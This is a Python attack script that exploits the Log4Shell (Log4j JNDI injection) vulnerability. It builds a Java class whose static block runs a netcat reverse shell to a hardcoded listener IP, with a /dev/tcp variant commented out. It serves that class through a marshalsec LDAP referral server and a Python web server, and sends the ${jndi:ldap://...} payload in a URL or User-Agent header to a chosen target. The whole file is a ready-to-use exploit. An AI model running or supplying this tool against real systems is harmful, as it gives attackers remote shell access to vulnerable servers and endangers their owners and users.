#!/bin/python3
import requests
import os
import threading
import time
import sys




#command = "/bin/bash -i >& /dev/tcp/10.9.242.239/10.9.242.239/1234 0>&1"
command = "nc -e /bin/bash 10.9.242.239 1234"
payload = """
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec(\"""" + command + """ \");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
"""




#Displays help
help2 = """
--ssl --> Adds https before the ip before sending the exploit (NO ARGS)
--method --> Methods are: "in_url" for example: http://site.com/?foo=inject_here  and "in_header" (its set to user-agent no exceptions)
--setup --> Automaticly install all dependencies for the script to work (works only with apt)
--help/-h --> Prints this page
-ti --> Target ip
-tp --> Target port
-li --> Listening ip (0.0.0.0 for all)
-pp --> The port that the python webserver will be using
-lp --> Listening port for netcat (you have to run netcat yourself for technical reasons) 
-cp --> Custom Path for the website for example /admin
"""
def help():
     global help2
     print(help2)
     exit()

def attack(method):
   global ti, tp, inject, cp
   if method == "in_url":
      time.sleep(3)
      print("Insert the string \"LOG4J_HERE\" (all caps) to where you want to inject the exploit into")
      url = input("Url:") 
      if "LOG4J_HERE" not in  url:
             print("\"LOG4J_HERE\" not found")
             attack("in_url")
      url = url.replace("LOG4J_HERE", inject)
      print(url)
      req = requests.get(url)
      print("Exploit sent! If it succeeded you should see Exploit.class being requested below")

   elif method == "in_header":
         headers2 = {
           "Host": ti,
           "User-Agent":  inject,
           "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
           "Accept-Language": "en-US,en;q=0.5" ,
           "Accept-Encoding": "gzip, deflate",
           "Dnt": "1",
           "Upgrade-Insecure-Requests": "1",
           "Sec-Gpc": "1",
           "Te": "trailers",
           "Connection": "close"  
         }   
         print(headers2)
         sl = "http"
         if ssl:
           sl = "https"
         if cp == None:
           cp = ""
         url = f"{sl}://{ti}:{tp}/{cp}"
         
         req = requests.get(url, headers=headers2)
         print("Exploit sent! If it succeeded you should see Exploit.class being requested below")
   else:
        print("Invalid method, ethods are: in_url, in_header")
        exit()

def setup():
    print("Installing packages...")
    os.system("apt install nc")
    os.system("apt install git")
    if "marshalsec" not in os.popen("ls").read():
       print("Installing marshalsec in " + os.popen("pwd").read().strip("\n") + "/marshalsec")
       os.system("git clone https://github.com/mbechler/marshalsec")
    os.chdir("marshalsec")
    os.system("mvn clean package -DskipTests")
    os.chdir("..")
    print("Installed!")
    exit()


#Finds arguments
def getarg(search):
   for i in range(len(sys.argv)):
#              print(sys.argv[i])
              if "-h" in sys.argv[i] or "--help" in sys.argv[i]: 
                 help()
                 exit()
              if sys.argv[i] == search:
                return sys.argv[i +1]


def a_thread(command):
  try:
   os.system(command)
  except:
   print("Something went wrong? have you ran the --setup command???")

if "--setup" in sys.argv:
   setup()
   exit()
ti = getarg("-ti")
tp = getarg("-tp")
li = getarg("-li")
pp = getarg("-pp")
lp = getarg("-lp")
cp = getarg("-cp")
ssl = getarg("--ssl")
method = getarg("--method")
check = [ti, tp, li, pp, lp, method]




for val in check:
    if val == None:
       print("Value not supplied. Required args:-ti -tp -li -pp -lp  --method or for help -h/--help")
       exit()
inject = "${jndi:ldap://"+li+":1389/Exploit}"
os.chdir("marshalsec")
#cm = f"java -cp marshalsec*-all.jar marshalsec.jndi.LDAPRefServer \"http://{li}:{lp}/#Exploit\""
cm = f"java -cp target/marshalsec*SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://{li}:{pp}/#Exploit\""
print(cm) 
threading.Thread(target=a_thread, args=(cm,)).start()
os.chdir("..")
print("Marshalsec server running!") 
open("Exploit.java", "w").write(payload) 
os.system("mkdir Log4jPayload_by_VS")
os.system("mv Exploit.java Log4jPayload_by_VS && javac Log4jPayload_by_VS/Exploit.java -source 8 -target 8")
os.chdir("Log4jPayload_by_VS")
threading.Thread(target=a_thread, args=(f"python3 -m http.server {pp}",)).start()
attack(method)
